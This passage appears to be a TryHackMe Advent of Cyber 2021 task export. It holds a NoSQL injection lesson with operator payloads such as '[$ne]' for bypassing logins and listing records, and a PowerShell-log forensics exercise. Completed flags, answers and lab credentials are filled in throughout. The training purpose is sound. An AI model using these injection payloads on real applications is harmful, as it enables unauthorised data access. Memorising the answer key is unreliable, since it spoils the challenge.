0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">GET</span><span style=\"font-size:1rem\"> or </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">POST</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">queries, and sometimes web applications accept a </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">JSON</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">object, as is the case with </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">APIs</span><span style=\"font-size:1rem\">.</span></p><p><span style=\"font-size:1rem\">Injecting a NoSQL query has different forms if we deal with</span><span style=\"font-size:1rem\"> </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">GET</span><span style=\"font-size:1rem\"> or </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">POST</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">queries than JSON objects but still have the same concept. Let's discuss how to inject into regular </span><span style=\"font-size:1rem\"> </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">GET</span><span style=\"font-size:1rem\"> or </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">POST</span><span style=\"font-size:1rem\"> requests. To interact with MongoDB via</span><span style=\"font-size:1rem\"> </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">GET</span><span style=\"font-size:1rem\"> or </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">POST</span><span style=\"font-size:1rem\"> is by injecting an array of the MongoDB operator to match the JSON objection to match the </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">Key: Value</span><span style=\"font-size:1rem\">. The following is an example of how to inject via URL:</span></p><pre style=\"font-size:14px\">  <code class=\"language-scheme\"><span style=\"font-size:10px\">http://example.thm.labs/search?username=admin&amp;role[$ne]=user</span></code></pre><p>Note that we inject the MongoDB operator [$ne] (not equal) in the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">role</span><span style=\"font-size:1rem\"> </span>parameter. We can also use the same concept to pass the MongoDB operators in the<span style=\"font-size:1rem\"> </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">POST</span><span style=\"font-size:1rem\"> </span>requests.</p><p>We built a playground web application to search for the user(s) with a specific role! To perform NoSQL injection, first, you need to bypass the login page, as we discussed in the previous section.</p><p>Let's see the normal case where we search for username is equal <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">ben</span><span style=\"font-size:1rem\"> </span>with the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">user</span><span style=\"font-size:1rem\"> </span>role.</p><pre style=\"font-size:14px\">  <code class=\"language-scheme\"><span style=\"font-size:10px\">http://example.thm.labs/search?username=ben&amp;role=user</span></code></pre><p>As a result, the web application returns the expected result from MongoDB. Now let's inject MongoDB to show unexpected results! We will try to list all usernames that have a <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">user</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">role!</span></p><pre style=\"font-size:14px\">  <code class=\"language-scheme\"><span style=\"font-size:10px\">http://example.thm.labs/search?username[$ne]=ben&amp;role=user</span></code></pre><p><span style=\"font-size:1rem\">As a result, the web application will return many records from MongoDB that satisfy the query. <u>It is practice time;</u> now make sure you have deployed the attached machine </span>and the AttackBox (to use Burp)<span style=\"font-size:1rem\">, try to list all usernames that have </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">guest</span><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">roles. <span style=\"font-weight:bolder\">Find the flag and answer question #2 below</span></span></p><p>You can access and visit the website via the following link: <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">http://LAB_WEB_URL.p.thmlabs.com</span><span style=\"font-size:1rem\"> or </span><span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">http://MACHINE_IP</span><span style=\"font-size:1rem\"> in case you're using the AttackBox.<br /><br /></span></p><p><span style=\"font-weight:bolder;font-size:24px\">Additional Resources</span><span style=\"font-size:24px\"><span style=\"font-weight:bolder\"><br /></span></span>If you are interested in learning more about injection vulnerabilities, check out the <a href=\"https://tryhackme.com/room/sqlinjectionlm\" target=\"_blank\">SQL injection</a> and <a href=\"https://tryhackme.com/room/oscommandinjection\" target=\"_blank\">Command Injection</a> rooms on TryHackMe.<span style=\"font-size:1rem\"><br /></span></p>","taskType":"vm","taskNo":12,"taskCreated":"2021-11-16T13:42:12.628Z","taskDeadline":null,"tasksInfo":[{"question":"Interact with the MongoDB server to find the flag. What is the flag?","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{8814a5e6662a9763f7df23ee59d944f9}","noAnswer":false,"answerDesc":"Answer format: ***{********************************}"},{"question":"<p>We discussed how to bypass login pages as an admin. Can you log into the application that Grinch Enterprise controls as <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">admin</span><span style=\"font-size:1rem\"> </span>and retrieve the flag?</p><p>Use the knowledge given in AoC3 day 4 to setup and run Burp Suite proxy to intercept the HTTP request for the login page. Then modify the POST parameter.</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/11ebe0504325632b2690ebb147fdcf58.png\" /></p>","hint":"Review the bypass login pages section","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{b6b304f5d5834a4d089b570840b467a8}","noAnswer":false,"answerDesc":"Answer format: ***{********************************}"},{"question":"<p><span style=\"font-size:1rem\">Once you are logged in, </span>use the gift search page to list all usernames that have <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">guest</span><span style=\"font-size:1rem\"> roles. What is the flag?</span><br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"THM{2ec099f2d602cc4968c5267970be1326}","noAnswer":false,"answerDesc":"Answer format: ***{********************************}"},{"question":"<p>Use the gift search page to perform NoSQL injection and retrieve the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">mcskidy</span><span style=\"font-size:1rem\"> record. What is the details record?</span><br /></p>","hint":"details format as follows, ID:xxxx:mcskidy:xxxxx","questionNo":4,"correct":true,"extraPoints":0,"attempts":0,"submission":"ID:6184f516ef6da50433f100f4:mcskidy:admin","noAnswer":false,"answerDesc":"Answer format: **:************************:*******:*****"}],"uploadId":"619cddbce89dbd009cf627ac","questions":[{"questionNo":1,"question":"Interact with the MongoDB server to find the flag. What is the flag?","hint":""},{"questionNo":2,"question":"<p>We discussed how to bypass login pages as an admin. Can you log into the application that Grinch Enterprise controls as <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">admin</span><span style=\"font-size:1rem\"> </span>and retrieve the flag?</p><p>Use the knowledge given in AoC3 day 4 to setup and run Burp Suite proxy to intercept the HTTP request for the login page. Then modify the POST parameter.</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/11ebe0504325632b2690ebb147fdcf58.png\" /></p>","hint":"Review the bypass login pages section"},{"questionNo":3,"question":"<p><span style=\"font-size:1rem\">Once you are logged in, </span>use the gift search page to list all usernames that have <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">guest</span><span style=\"font-size:1rem\"> roles. What is the flag?</span><br /></p>","hint":""},{"questionNo":4,"question":"<p>Use the gift search page to perform NoSQL injection and retrieve the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">mcskidy</span><span style=\"font-size:1rem\"> record. What is the details record?</span><br /></p>","hint":"details format as follows, ID:xxxx:mcskidy:xxxxx"}]},{"taskTitle":"[Day 8] <span class=\"badge badge-soft-info size-16\">Special by John Hammond</span> Santa's Bag of Toys","taskDesc":"<h2><span style=\"font-size:24px\">Check out John Hammond's walkthrough video for day 8 </span><a href=\"https://www.youtube.com/watch?v=oGX7vLtjbic\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><p><span style=\"font-size:1rem\"><br />McSkidy was notified of some terrible news! Santa's laptop, which he uses to prepare his bag of toys for Christmas, is missing! We believe a minion at the Grinch Enterprise stole it, but we need to find out for sure. It is up to us to determine what actor compromised the laptop and recover Santa's bag of toys!</span><span style=\"font-size:18px\"><br /></span></p><p>Unfortunately, The Best Festival Company had minimal monitoring tools on Santa's laptop (he is the boss, after all)! All we have to work with are some PowerShell Transcription Logs we were able to remotely recover just after it went missing. <span style=\"font-weight:bolder;font-style:italic\">You can find the transcription logs within the </span><code style=\"font-size:14px\"><span style=\"font-weight:bolder\">SantasLaptopLogs</span></code><span style=\"font-weight:bolder;font-style:italic\"> folder on the Desktop of the attached Windows virtual machine.</span><br /></p><p>If you aren't familiar, PowerShell Transcription Logs capture the input and output of Windows PowerShell commands, allowing an analyst to review what happened when. Typically, PowerShell Transcription can be enabled by Group Policy, but another method to turn on this logging is by configuring the Windows Registry.</p><p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/5cf70eb43cffd364046f5c83/room-content/db043444e0f48f521f7825b419465745.png\" style=\"max-width:100%;height:auto\" /></p><p>While you do not have to use these commands for this task, these will turn on PowerShell Transcription Logging for a local host if entered in an Administrator command prompt:</p><p></p><pre style=\"font-size:14px\">reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0x1 /f\nreg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v OutputDirectory /t REG_SZ /d C:/ /f\nreg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableInvocationHeader /t REG_DWORD /d 0x1 /f</pre><p></p><p>The Windows Registry is a large database of operating system settings and configurations. It is organized by \"hives\", with each hive containing \"keys\" and their corresponding \"values.\" PowerShell Transcription Logging can be enabled in this way \"per-user\" via the <code style=\"font-size:14px\">HKEY_CURRENT_USER</code><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">registry hive, or across the entire host via the </span><code style=\"font-size:14px\">HKEY_LOCAL_MACHINE</code><span style=\"font-size:1rem\"> registry hive. Thankfully, Santa's laptop had this enabled machine-wide!</span></p><p><span style=\"font-weight:bolder\"><i>Note that for this task, you will interact with a Windows virtual machine to perform your analysis. For the sake of storyline, this is <u>not</u> Santa's laptop... rather, you have sample files that were recovered before the laptop was stolen.</i></span></p><p><span style=\"font-weight:bolder;font-size:24px\">Additional Resources</span><span style=\"font-size:24px\"><span style=\"font-weight:bolder\"><br /></span></span>If you are interested in learning more about the Windows Fundamentals, check out the <a href=\"https://tryhackme.com/module/windows-fundamentals\" target=\"_blank\">Windows Fundamentals</a> module on TryHackMe.<br /></p>","taskType":"vm","taskNo":13,"taskCreated":"2021-11-16T13:42:13.743Z","taskDeadline":null,"tasksInfo":[{"question":"<p><b>Read the premise above, start the attached Windows analysis machine and </b><span style=\"font-weight:bolder;font-size:1rem\">find the transcription logs in the</span><span style=\"font-weight:bolder;font-size:1rem\"> </span><code style=\"font-weight:bolder;font-size:14px\">SantasLaptopLogs</code><span style=\"font-weight:bolder;font-size:1rem\"> </span><span style=\"font-weight:bolder;font-size:1rem\">folder on the Desktop.</span></p><p><i><b>If you want to RDP into the machine, start the AttackBox and enter the following into a terminal: xfreerdp /u:Administrator /p:grinch123! /v:MACHINE_IP - </b><span style=\"font-weight:700;font-size:1rem\">The credentials for the machine are Administrator as the username, and grinch123! as the password.</span></i></p>","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p>Each transcription log is a simple plain text file that you can open in any editor of your choice. While the filenames are random, you can get an idea as to which log \"comes first\" by looking at the Date Modified or Date Created attributes, or the timestamps just before the file extension!</p><p>Open the first transcription log. You can see the commands and output for everything that ran within PowerShell, like <code>whoami</code> and <code>systeminfo</code>! <br /><br /><b>What operating system is Santa's laptop running (\"OS Name\")?</b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP._s3k_jad.20211128153510.txt","questionNo":2,"correct":true,"extraPoints":0,"attempts":3,"submission":"Microsoft Windows 11 Pro","noAnswer":false,"answerDesc":"Answer format: ********* ******* ** ***"},{"question":"<p>Review each transcription log to get an idea for what activity was performed on the laptop just after it went missing. In the \"second\" transcription log, it seems as if the perpetrator created a backdoor user account!<br /><br /><b>What was the password set for the new \"backdoor\" account?</b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP.k_dg27us.20211128153538.txt","questionNo":3,"correct":true,"extraPoints":0,"attempts":1,"submission":"grinchstolechristmas","noAnswer":false,"answerDesc":"Answer format: ********************"},{"question":"<p>In one of the transcription logs,  the bad actor interacts with the target under the new backdoor user account, and copies a unique file to the Desktop. Before it is copied to the Desktop, <b>what is the full path of the original file? </b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP.Zw6PA+c4.20211128153734.txt","questionNo":4,"correct":true,"extraPoints":0,"attempts":0,"submission":"C:\\Users\\santa\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat","noAnswer":false,"answerDesc":"Answer format: *:*****************************************************.***"},{"question":"<p>The actor uses a <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Certutil/\" target=\"_blank\">Living Off The Land </a>binary (LOLbin) to encode this file, and then verifies it succeeded by viewing the output file. <b>What is the name of this LOLbin?</b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP.Zw6PA+c4.20211128153734.txt ","questionNo":5,"correct":true,"extraPoints":0,"attempts":1,"submission":"certutil.exe","noAnswer":false,"answerDesc":"Answer format: ********.***"},{"question":"<p>The <code>UsrClass.dat</code> file was encoded with Base64, which thankfully, you can decode and recover the original <code>UsrClass.dat</code> file!  Base64 decode the contents between the <code>-----BEGIN CERTIFICATE-----</code> and <code>-----END CERTIFICATE-----</code> markers within the transcription log with CyberChef, which you have a local copy of on the Desktop of your analysis machine. </p><p>This file can be used to aid in our investigation. The <code>UsrClass.dat</code> file contains \"Shellbags,\" or artifacts contained within the Windows registry that store user preferences while viewing folders within the Windows Explorer GUI. If you could carve out this information, you could get an idea as to what user activity was performed on the laptop before it was stolen or compromised! For more details and information on Shellbags, you are strongly encouraged to do some <a href=\"https://shehackske.medium.com/windows-shellbags-part-1-9aae3cfaf17\" target=\"_blank\">extra reading</a> or research. :)</p><p>To extract the Shellbags information within this <code>UsrClass.dat</code> file, we will use the \"<a href=\"https://www.sans.org/tools/shellbags-explorer/\" target=\"_blank\">Shellbags Explorer</a>\" graphical utility put together by <a href=\"https://ericzimmerman.github.io/#!index.md\" target=\"_blank\">Eric Zimmerman</a>. This utility is found readily available inside the <code>ShellBagsExplorer</code> folder on the Desktop of your Windows machine, with the application name <code>ShellBagsExplorer.exe</code> .</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/001_shellbags_explorer.png\" style=\"max-width:100%;height:auto\" /><br /></p><p><b>Read the above and open the <code>ShellBagsExplorer.exe</code></b> <b>application found in the folder on your Desktop.</b></p>","hint":"","questionNo":6,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p><span style=\"font-size:1rem\">With </span><code style=\"font-size:14px\">ShellBagsExplorer.exe</code><span style=\"font-size:1rem\">  open, use the top-bar menu to select </span><code style=\"font-size:14px\">File</code><span style=\"font-size:1rem\">  -&gt; </span><code style=\"font-size:14px\">Load offline hive</code><span style=\"font-size:1rem\"> and navigate to the location of where you saved the decoded </span><code style=\"font-size:14px\">UsrClass.dat</code><span style=\"font-size:1rem\"> . Load in the </span><code style=\"font-size:14px\">UsrClass.dat</code><span style=\"font-size:1rem\"> file and begin to explore the Shellbags discovered!</span></p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/002_shellbags_load.png\" style=\"max-width:100%;height:auto\" /><span style=\"font-size:1rem\"></span></p><p><span style=\"font-size:1rem\">Under the Desktop folder, there seems to be a suspicious folder named \"SantaRat\". Could this be a remote access trojan, that was used for further nefarious activity on Santa's laptop? Unfortunately, from just Shellbags alone, we only have insight into folder names (sometimes files, if we are lucky) and column data within Windows Explorer, but not files... how could we uncover more details?</span><br /></p><p>Drill down into the folders and see if you can find anything that might indicate how we could better track down what this SantaRat really is. <b>What specific folder name clues us in that this might be publicly accessible software hosted on a code-sharing platform?</b></p>","hint":"The folder name starts with a \".\" dot or period :)","questionNo":7,"correct":true,"extraPoints":0,"attempts":3,"submission":".github","noAnswer":false,"answerDesc":"Answer format: .******"},{"question":"<p>Additionally, there is a unique folder named \"Bag of Toys\" on the Desktop! This must be where Santa prepares his collection of toys, and this is certainly sensitive data that the actor could have compromised. <span style=\"font-weight:bolder\">What is the name of the file found in this folder? </span><br /></p>","hint":"It's a ZIP file! :)","questionNo":8,"correct":true,"extraPoints":0,"attempts":0,"submission":"bag_of_toys.zip","noAnswer":false,"answerDesc":"Answer format: ***********.***"},{"question":"<p>Track down this SantaRat software online. <span style=\"font-size:1rem\">It may be just as simple as searching for the name of the software on the suggested website (Github).</span></p><p><i>Note that the TryHackMe Windows analysis machine does not have Internet access, so you will need to explore in your own web browser.</i></p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/003_santarat_github.png\" style=\"max-width:100%;height:auto\" /><i></i></p><p><b style=\"font-size:1rem\">What is the name of the user that owns the SantaRat repository?</b><br /></p>","hint":"https://github.com/search?q=SantaRat","questionNo":9,"correct":true,"extraPoints":0,"attempts":0,"submission":"Grinchiest","noAnswer":false,"answerDesc":"Answer format: **********"},{"question":"<p>Explore the other repositories that this user owns. <b>What is the name of the repository that seems especially pertinent to our investigation?</b></p>","hint":"https://github.com/Grinchiest","questionNo":10,"correct":true,"extraPoints":0,"attempts":1,"submission":"operation-bag-of-toys","noAnswer":false,"answerDesc":"Answer format: *********************"},{"question":"<p>Read the information presented in this repository. It seems as if the actor has, in fact, compromised and tampered with Santa's bag of toys! You can review the activity in the transcription logs. It looks as if the actor installed a special utility to collect and eventually exfiltrate the bag of toys. <b>What is the name of the <i>executable</i> that installed a unique utility the actor used to collect the bag of toys?</b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP.b+XfnW7t.20211128154858.txt","questionNo":11,"correct":true,"extraPoints":0,"attempts":0,"submission":"uharc-cmd-install.exe","noAnswer":false,"answerDesc":"Answer format: *****************.***"},{"question":"<p>In the last transcription log, you can see the activity that this actor used to tamper with Santa's bag of toys! It looks as if they collected the original contents with a <a href=\"https://fileinfo.com/extension/uha\" target=\"_blank\">UHA</a> archive. A UHA archive is similar to a ZIP or RAR archive, but faster and with better compression rates. It is very rare to see, but it looks the Grinch Enterprises are pulling out all the tricks!</p><p>You can see the actor compressed the original contents of the bag of toys with a password. Unfortunately, we are unable to see what the specific password was in these transcription logs! Perhaps we could find it elsewhere...</p><p>Following this, the actor looks to have removed everything from the bag of toys, and added in new things like coal, mold, worms, and more!  <b>What are the contents of these \"malicious\" files (coal, mold, and all the others)?</b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP.myCoN9lB.20211128155453.txt","questionNo":12,"correct":true,"extraPoints":0,"attempts":0,"submission":"GRINCHMAS","noAnswer":false,"answerDesc":"Answer format: *********"},{"question":"<p>We know that the actor seemingly collected the original bag of toys. Maybe there was a slight OPSEC mistake, and we might be able to recover Santa's Bag of Toys! Review the actor's repository for its planned operations... maybe in the commit messages, we could find the original archive and the password!</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/004_commits.png\" style=\"max-width:100%;height:auto\" /></p>","hint":"","questionNo":13,"correct":true,"extraPoints":0,"attempts":0,"submission":"","noAnswer":true,"answerDesc":"No answer needed"},{"question":"<p><b>What is the password to the original bag_of_toys.uha archive? </b>(You do not need to perform any password-cracking or bruteforce attempts)</p>","hint":"Look closely at the GitHub commit that includes the bag_of_toys.uha file. :)","questionNo":14,"correct":true,"extraPoints":0,"attempts":0,"submission":"TheGrinchiestGrinchmasOfAll","noAnswer":false,"answerDesc":"Answer format: ***************************"},{"question":"<p>McSkidy was able to download and save a copy of the <code>bag_of_toys.uha</code> archive, and you have it accessible on the Desktop of the Windows analysis machine. After uncovering the password from the actor's GitHub repository, you have everything you need to restore Santa's original bag of toys!! </p><p>Double-click on the archive on the desktop to open a graphical UHARC extraction utility that has been prepared for you. Using the password you uncovered, extract the contents into a location of your choosing (you might make a \"Bag of Toys\" directory on the Desktop to save all the files into).</p><p>With that, you have successfully recovered the original contents of Santa's Bag of Toys! You can view these in the Windows Explorer file browser to see how many were present.</p><p><b>How many original files were present in Santa's Bag of Toys?</b></p>","hint":"","questionNo":15,"correct":true,"extraPoints":0,"attempts":0,"submission":"228","noAnswer":false,"answerDesc":"Answer format: ***"}],"uploadId":"61ae8e445d5b1500509fc92d","questions":[{"questionNo":1,"question":"<p><b>Read the premise above, start the attached Windows analysis machine and </b><span style=\"font-weight:bolder;font-size:1rem\">find the transcription logs in the</span><span style=\"font-weight:bolder;font-size:1rem\"> </span><code style=\"font-weight:bolder;font-size:14px\">SantasLaptopLogs</code><span style=\"font-weight:bolder;font-size:1rem\"> </span><span style=\"font-weight:bolder;font-size:1rem\">folder on the Desktop.</span></p><p><i><b>If you want to RDP into the machine, start the AttackBox and enter the following into a terminal: xfreerdp /u:Administrator /p:grinch123! /v:MACHINE_IP - </b><span style=\"font-weight:700;font-size:1rem\">The credentials for the machine are Administrator as the username, and grinch123! as the password.</span></i></p>","hint":""},{"questionNo":2,"question":"<p>Each transcription log is a simple plain text file that you can open in any editor of your choice. While the filenames are random, you can get an idea as to which log \"comes first\" by looking at the Date Modified or Date Created attributes, or the timestamps just before the file extension!</p><p>Open the first transcription log. You can see the commands and output for everything that ran within PowerShell, like <code>whoami</code> and <code>systeminfo</code>! <br /><br /><b>What operating system is Santa's laptop running (\"OS Name\")?</b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP._s3k_jad.20211128153510.txt"},{"questionNo":3,"question":"<p>Review each transcription log to get an idea for what activity was performed on the laptop just after it went missing. In the \"second\" transcription log, it seems as if the perpetrator created a backdoor user account!<br /><br /><b>What was the password set for the new \"backdoor\" account?</b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP.k_dg27us.20211128153538.txt"},{"questionNo":4,"question":"<p>In one of the transcription logs,  the bad actor interacts with the target under the new backdoor user account, and copies a unique file to the Desktop. Before it is copied to the Desktop, <b>what is the full path of the original file? </b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP.Zw6PA+c4.20211128153734.txt"},{"questionNo":5,"question":"<p>The actor uses a <a href=\"https://lolbas-project.github.io/lolbas/Binaries/Certutil/\" target=\"_blank\">Living Off The Land </a>binary (LOLbin) to encode this file, and then verifies it succeeded by viewing the output file. <b>What is the name of this LOLbin?</b></p>","hint":"You can find this in PowerShell_transcript.LAPTOP.Zw6PA+c4.20211128153734.txt "},{"questionNo":6,"question":"<p>The <code>UsrClass.dat</code> file was encoded with Base64, which thankfully, you can decode and recover the original <code>UsrClass.dat</code> file!  Base64 decode the contents between the <code>-----BEGIN CERTIFICATE-----</code> and <code>-----END CERTIFICATE-----</code> markers within the transcription log with CyberChef, which you have a local copy of on the Desktop of your analysis machine. </p><p>This file can be used to aid in our investigation. The <code>UsrClass.dat</code> file contains \"Shellbags,\" or artifacts contained within the Windows registry that store user preferences while viewing folders within the Windows Explorer GUI. If you could carve out this information, you could get an idea as to what user activity was performed on the laptop before it was stolen or compromised! For more details and information on Shellbags, you are strongly encouraged to do some <a href=\"https://shehackske.medium.com/windows-shellbags-part-1-9aae3cfaf17\" target=\"_blank\">extra reading</a> or research. :)</p><p>To extract the Shellbags information within this <code>UsrClass.dat</code> file, we will use the \"<a href=\"https://www.sans.org/tools/shellbags-explorer/\" target=\"_blank\">Shellbags Explorer</a>\" graphical utility put together by <a href=\"https://ericzimmerman.github.io/#!index.md\" target=\"_blank\">Eric Zimmerman</a>. This utility is found readily available inside the <code>ShellBagsExplorer</code> folder on the Desktop of your Windows machine, with the application name <code>ShellBagsExplorer.exe</code> 